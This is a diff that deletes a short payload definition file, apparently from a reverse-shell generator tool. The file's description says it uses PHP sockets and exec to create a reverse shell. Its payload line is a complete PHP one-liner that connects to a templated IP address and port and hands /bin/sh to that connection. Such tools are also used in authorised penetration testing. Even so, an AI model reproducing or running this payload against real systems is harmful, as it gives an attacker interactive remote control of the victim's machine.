@@ -1,7 +1,0 @@
-[Info]
-Author      = vesche
-Description = Uses PHP sockets & exec to create a reverse shell.
-
-[Payload]
-Type     = Reverser
-Payload  = php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
